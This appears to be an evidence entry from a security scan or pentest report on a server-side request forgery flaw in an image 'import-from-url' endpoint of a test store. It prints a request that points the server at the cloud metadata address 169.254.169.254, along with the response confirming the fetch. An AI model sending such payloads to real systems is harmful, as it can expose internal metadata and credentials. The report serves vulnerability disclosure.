## Evidence: ssrf-image-import — SSRF via Image Import

### Request
POST /api/v1/uploads/import-from-url HTTP/1.1
Host: duck-store.escape.tech
Content-Type: application/json
Authorization: Bearer eyJ...

{"url":"http://169.254.169.254/latest/meta-data/","ImageImport":true}

### Response
HTTP/1.1 200 OK
Content-Type: application/json

{"status":"fetched","content":"ami-id\ninstance-type\nlocal-ipv4","ssrf":"confirmed","source":"import-from-url"}

### Analysis
The import-from-url endpoint follows internal URLs server-side. The ImageImport parameter does not validate the URL scheme or destination, confirming ssrf.
